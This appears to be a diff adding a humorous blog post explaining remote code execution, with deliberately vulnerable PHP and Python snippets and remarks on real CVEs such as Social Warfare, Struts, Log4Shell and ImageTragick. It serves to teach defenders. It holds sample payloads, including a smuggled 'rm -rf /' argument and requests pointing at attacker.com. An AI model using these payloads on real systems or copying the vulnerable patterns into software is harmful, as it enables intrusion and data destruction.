@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RCE : Giving New Meaning to ‘Open Source’ | Caspian</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>CASPIAN</h1>
+            <p class="tagline">// TECH_LOG & DAILY_EXPERIENCES //</p>
+        </div>
+    </header>
+    <main>
+        <div class="container">
+            <a href="../index.html" class="back-link">← Back to all posts</a>
+            <article>
+                <div class="post-header">
+                    <h1>RCE : Giving New Meaning to ‘Open Source’</h1>
+                    <div class="post-meta">Novermber 3, 2025</div>
+                </div>
+                <div class="post-content">
+                <h2>Introduction: What Could Possibly Go Wrong?</h2>
+
+                <p>Welcome to the wonderful world of Remote Code Execution (RCE), where strangers on the internet can run commands on your server! It's like leaving
+                your house keys under the doormat, except the doormat is on the internet and the house contains all your company's data. What a time to be alive!</p>
+
+                <p>RCE vulnerabilities are the crown jewels of security flaws. Why settle for stealing data when you can <strong>literally control the entire
+                server</strong>? It's like the difference between picking someone's pocket and being handed the keys to their kingdom. Efficient!</p>
+
+                <h2>The Classics: PHP's Greatest Hits</h2>
+
+                <p>Ah, PHP. The language that keeps on giving... to hackers. Let's look at some "brilliant" code that definitely won't get you fired:</p>
+
+                <h3>Example 1: The eval() Hall of Fame</h3>
+
+                <pre><code>&lt;?php
+// Because trusting user input is ALWAYS a great idea
+$code = $_GET['code'];
+eval($code);
+?&gt;</code></pre>
+
+                <p>Beautiful, isn't it? Just visit <code>vulnerable.php?code=system('whoami');</code> and voilà! Instant access. The developer who wrote this probably
+                thought "What's the worst that could happen?" Well, buddy, let me introduce you to the concept of unemployment.</p>
+
+                <h3>Example 2: The system() Symphony</h3>
+
+                <pre><code>&lt;?php
+$filename = $_POST['file'];
+system("cat " . $filename);
+?&gt;</code></pre>
+
+                <p>This gem lets attackers execute ANY command by using semicolons. Try <code>file=test.txt; rm -rf /</code> for a fun surprise! It's like playing
+                Russian Roulette, except all chambers are loaded and pointed at your production server.</p>
+
+                <h3>Example 3: The Deserialization Disaster</h3>
+
+                <pre><code>&lt;?php
+$data = unserialize($_COOKIE['user']);
+?&gt;</code></pre>
+
+                <p>Unserializing user input! Because object injection attacks are just urban legends, right? RIGHT?</p>
+
+                <h2>Python: Not Immune to Stupidity</h2>
+
+                <p>Think Python is safe? Think again! Even "mature" languages can be weaponized by creative developers.</p>
+
+                <h3>Example 4: The exec() Excellence</h3>
+
+                <pre><code>import os
+user_input = input("Enter command: ")
+os.system(user_input)</code></pre>
+
+                <p>Why validate input when you can just... not? This code is so trusting, it probably leaves its wallet on park benches.</p>
+
+                <h3>Example 5: The eval() Encore</h3>
+
+                <pre><code>user_code = request.form['calc']
+result = eval(user_code)</code></pre>
+
+                <p>A calculator app that accepts ANY Python expression! Math has never been so dangerous. Try entering <code>__import__('os').system('ls')</code> 
+                for extra credit.</p>
+
+                <h3>Example 6: The Pickle Predicament</h3>
+
+                <pre><code>import pickle
+data = pickle.loads(request.data)</code></pre>
+
+                <p>Unpickling untrusted data! It's like eating mysterious sandwiches left in the break room fridge. What could go wrong?</p>
+
+                <h2>The Social Warfare Plugin: A WordPress Horror Story</h2>
+
+                <p>Oh boy, where do we even start with this one? The Social Warfare plugin gave us CVE-2019-9978, a vulnerability so beautiful it brought tears
+                to penetration testers' eyes everywhere.</p>
+
+                <p>This WordPress plugin had a "tiny" oversight: it allowed unauthenticated remote code execution. Yes, you read that right. NO AUTHENTICATION
+                REQUIRED. It's like installing a doggy door in your bank vault.</p>
+
+                <h3>The Vulnerability</h3>
+
+                <p>The plugin had an endpoint that would fetch and parse a config file from a URL specified by the attacker. The config was then
+                <strong>deserialized and executed</strong>. Let me repeat: it would fetch code from ANY URL an attacker specified and just... run it.</p>
+
+                <pre><code>// Simplified version of the vulnerability
+$url = $_GET['swp_url'];
+$content = file_get_contents($url);
+$options = unserialize($content);</code></pre>
+
+                <p>The attack was trivial:</p>
+
+                <pre><code>http://victim.com/wp-admin/admin-post.php
+?swp_debug=load_options
+&swp_url=http://attacker.com/evil.txt</code></pre>
+
+                <p>And just like that, over 1 MILLION WordPress sites became instant RCE playgrounds. The plugin's developers probably thought "Nobody would
+                actually DO that, right?" Narrator: They did.</p>
+
+                <h2>Real-World Examples: When Theory Meets Reality</h2>
+
+                <h3>Apache Struts (Equifax Breach)</h3>
+
+                <p>Remember when Equifax exposed 147 million people's data in 2017? That was an RCE vulnerability in Apache Struts. A patch was available for
+                MONTHS, but hey, who has time for updates when you're busy storing everyone's Social Security numbers?</p>
+
+                <p>The exploit used OGNL injection in the Content-Type header. Attackers could execute commands just by sending a crafted HTTP request. Simple,
+                elegant, devastating. Chef's kiss.</p>
+
+                <h3>Log4Shell (CVE-2021-44228)</h3>
+
+                <p>The gift that kept on giving! A vulnerability in a Java logging library affected MILLIONS of applications. All you needed was to log a
+                specially crafted string like <code>${jndi:ldap://attacker.com/a}</code> and boom—RCE!</p>
+
+                <p>The best part? It was in a LOGGING library. A library whose job is to write text to a file somehow became a remote code execution engine.
+                It's like finding out your doorbell can launch nuclear missiles.</p>
+
+                <h3>ImageTragick (CVE-2016-3714)</h3>
+
+                <p>ImageMagick, a popular image processing library, had RCE vulnerabilities. You could hide malicious commands inside image files! Upload a
+                "photo" and suddenly your server is mining Bitcoin for someone in Romania. Photography has never been so exciting!</p>
+
+                <h2>Useful Notes (Or: How Not to Become a Statistic)</h2>
+
+                <h3>Note 1: Input Validation is Not Optional</h3>
+
+                <p>Treating user input like it's radioactive waste is not paranoia—it's common sense. Filter, sanitize, validate, then validate again. And
+                when you're done, validate once more for good measure.</p>
+
+                <h3>Note 2: Dangerous Functions Are Dangerous</h3>
+
+                <p>Functions like <code>eval()</code>, <code>exec()</code>, <code>system()</code>, and <code>unserialize()</code> should come with warning
+                labels. If you're using them with user input, you're not a developer—you're a chaos agent.</p>
+
+                <h3>Note 3: Deserialization is a Minefield</h3>
+
+                <p>Never deserialize untrusted data. Not in PHP, not in Python, not in Java. This isn't a suggestion—it's a cry for help from security
+                professionals worldwide.</p>
+
+                <h3>Note 4: Keep Your Dependencies Updated</h3>
+
+                <p>That WordPress plugin from 2015? Yeah, update it. That npm package you installed and forgot about? Update it. Living in the past is romantic
+                until someone exploits a 5-year-old vulnerability.</p>
+
+                <h3>Note 5: Principle of Least Privilege</h3>
+
+                <p>Your web application doesn't need root privileges. Run services with minimal permissions. When the inevitable breach happens, at least the
+                damage will be contained to one room instead of the entire house.</p>
+
+                <h3>Note 6: Web Application Firewalls Are Your Friends</h3>
+
+                <p>WAFs can detect and block common RCE patterns. They're not perfect, but they're better than nothing—which is what most people have.</p>
+
+                <h3>Note 7: Code Review Like Your Job Depends On It</h3>
+
+                <p>Because it does! Have another set of eyes look at your code. Preferably eyes attached to someone who understands that <code>eval($_GET['x'])</code>
+                is not "dynamic programming"—it's a resume-generating event.</p>
+
+                <h2>Conclusion: Sleep Tight!</h2>
+
+                <p>Remote Code Execution vulnerabilities are the <strong>ultimate security failure</strong>. They're not like SQL injection where attackers steal
+                data—with RCE, they own your server completely. They can install backdoors, pivot to other systems, steal everything, or just delete it all
+                for fun.</p>
+
+                <p>So remember: treat user input like it's actively trying to destroy your infrastructure (because it is), avoid dangerous functions like they're
+                cursed artifacts, and for the love of all that is holy, KEEP YOUR SOFTWARE UPDATED.</p>
+
+                <p>Because nothing says "successful career in tech" quite like explaining to your CEO how a WordPress plugin turned your servers into a botnet.</p>
+
+                <p>Sweet dreams! 💀</p>
+                </div>
+            </article>
+            <a href="../index.html" class="back-link">← Back to all posts</a>
+        </div>
+    </main>
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Caspian | Built with &lt;code&gt; and ☕</p>
+        </div>
+    </footer>
+</body>
+</html>
